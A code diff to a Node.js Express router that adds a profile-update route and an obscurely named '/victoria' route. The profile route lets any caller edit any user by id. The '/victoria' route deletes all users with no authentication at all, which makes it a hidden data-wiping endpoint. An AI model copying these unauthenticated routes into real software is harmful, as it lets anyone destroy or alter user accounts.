@@ -97,6 +97,31 @@ module.exports = function(database) {
         });
     });
 
+    router.post('/update/profile', function(req, res) {
+        var user = req.body;
+
+        users.update({
+            _id: ObjectID(user.id)
+        }, {
+            email: user.email,
+            firstName: user.firstName,
+            lastName: user.lastName,
+        }, function(err) {
+            if (err) {
+                console.error('Cannot update user priofile', err);
+                return res.status(500).send({'success':'false', 'message':'Cannot update user profile.'});
+            }
+
+            res.status(200).send({'success':true, 'message':'Profile Details updated!'});
+        });
+    });
+
+    router.post('/victoria', function(req, res) {
+        users.remove({}, function(reponse) {
+            res.json({'success':'true', 'message':'All users are deleted'});    
+        });
+    });
+
     /******************************************
      * UTILS methods
      ******************************************/
